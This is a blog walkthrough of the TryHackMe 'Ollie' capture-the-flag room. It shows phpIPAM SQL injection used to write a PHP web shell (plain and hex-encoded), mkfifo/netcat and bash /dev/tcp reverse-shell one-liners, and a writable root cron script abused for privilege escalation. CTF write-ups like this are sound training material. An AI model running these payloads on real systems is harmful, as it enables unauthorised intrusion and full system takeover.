# Ollie
![img-description](/assets/img/posts/ollie/ollie.jpg)

Oh my god! I did this CTF only for Ollie, the dog!

You can find this CTF [here](https://tryhackme.com/room/ollie)

## <span style="color: var(--link-color);">Enumeration</span>

I began with a nmap TCP scan:

```
$ sudo nmap -sV -sS -sC -p- -v 10.10.112.144

I started with standard port like the 80 and I found a website:

![Website](/assets/img/posts/ollie/login.png)


## <span style="color: var(--link-color);">Foothold</span>
I tried some common credentials but didn't work. So I analyzed the port 1337 and I tried to connect by using netcat:
```

$ nc 10.10.112.144 1337
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name?
```

It seems that it wait for some answer. So, I got some questions and answer (bold my answer):
<pre><code>$ nc 10.10.112.144 1337
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? <b>user</b>
What's up, User! It's been a while. What are you here for? <b>nothing</b>
Ya' know what? User. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? <b>bulldog</b>
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: [CENSORED]

PS: Good luck and next time bring some treats!
</code></pre>

I used that credentials to log in to the website and they worked!

And there were other photos of Ollie!!! Every time I logged in they change! What a great CTF!

Before going ahead, I finished the enumeration and I used gobuster:

The interesting file was **http://10.10.112.144/db** because there was the tables' file of the DB:

![DB Files](/assets/img/posts/ollie/db_files.png)

By opening **SCHEMA.sql**, I found the schema of the user's table with a hash:
![DB Files](/assets/img/posts/ollie/db_schema.png)

I put this hash in **hashes.com** to see if there is some hash and, indeed, it finds a hash:

![Hash](/assets/img/posts/ollie/hash.png)

I tried to crack the hash but my PC didn't agree very much, so I was not able to crack it.


## <span style="color: var(--link-color);">User Access</span>

I go on and I search the version of the web application **phpIPAM IP address management [v1.4.5]**.

By searching the vulnerabilities of that version, I found an SQLi from the [this website](https://fluidattacks.com/advisories/mercury/)with the following PoC:

>Go to settings and enable the routing module <br>
>Go to show routing <br>
>Click on "Add peer" and create a new "BGP peer" <br>
>Click on the newly created "BGP peer" <br>
>Click on "Actions" and go to "Subnet Mapping" <br>
>Scroll down to "Map new subnet" <br>
>Insert an SQL Injection sentence inside the search parameter, for example: " union select @@version,2,user(),4 -- - <br>

So, I tried this PoC. I go to the "Routing" section:
![Routing](/assets/img/posts/ollie/routing.png)

And I see that there is already a "BGP Peer" in the list ("ThisIsTheOne", coincidence? I don't think so!). Then I enter the "ThisIsTheOne" BGP Peer and I click on "Actions" and I found the "Subnet Mapping" section:
![Action](/assets/img/posts/ollie/actions.png)

And in this section, I insert the payload of SQLi:

![SQLi](/assets/img/posts/ollie/check_vuln.png)

It works because I see in the response the version of DB is **8.0.28-0ubuntu0.20.04.3** and I have also the user **phpiam_ollie@localhost**.

The vulnerability is confirmed. I try to insert some files using the SQLi to create a Web Shell using the following payload:
```
<?php system($_GET["cmd"]); ?>
```
and encoded in hex became:
```
" union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -
```

![Web Shell](/assets/img/posts/ollie/insert_payload_shell.png)

This gives us error but the code is executed, indeed going to the path "/var/www/html/shell.php", I got a Web shell and I used it to create a reverse shell, by using the following payload:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.112.144 9999 >/tmp/f
```
Encoded as URL:
```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20%24IP%209999%20%3E%2Ftmp%2Ff
```

>Tips
>I advise you to use [this site](https://www.revshells.com/) to create the reverse shell, it is a great resource!

Before executing the payload, I set a netcat listener on my machine:
```
nc -lnvp 9999
```
Then, by executing the payload:

![Reverse Shell](/assets/img/posts/ollie/rev_shell.png)

I obtain a reverse shell:

![Reverse Shell](/assets/img/posts/ollie/reverse_shell.png)

But I am **www-data**. Since I have a password for user ollie, I try to reuse the credentials and we obtain the access as ollie:

![Ollie Access](/assets/img/posts/ollie/ollie_access.png)

We must say Ollie that it could never reuse the credentials. Ollie what are you doing?!?

> Tips:
> To spawn an interactive shell, I used **python3 -c 'import pty; pty.spawn("/bin/bash")'**


## <span style="color: var(--link-color);">Privilege Escalation</span>

For privilege escalation, I begin the enumeration using Linpeas but I don't find much.

![Meme Linpeas](/assets/img/meme/linpeas_out.png)

So, I used **Pspy** to watch the active processes (and I was angry because every time I close my reverse shell since I didn't create a persistent shell for my boredom).

After a bit, I see the process **2022/06/07 15:16:06 CMD: UID=0    PID=38250  | /bin/bash /usr/bin/feedme** and by watching the permission of that file, I see that the owner is root but the group is ollie. So, Ollie can modify it.

![FeedMe](/assets/img/posts/ollie/feedme_permission.png)

Watching the content of the file:
```
ollie@hackerdog:/var/www/html$ cat /usr/bin/feedme
cat /usr/bin/feedme
#!/bin/bash

# This is weird?
```

So, since pspy found it and seems that that file is executed after some minutes, I modify it with:
```
ollie@hackerdog:/var/www/html$ echo "bash -i >& /dev/tcp/10.8.80.159/1337 0>&1" >> /usr/bin/feedme
```

I start a listener on my machine and after some minutes, I get the root reverse shell:

![Root](/assets/img/posts/ollie/root.png)
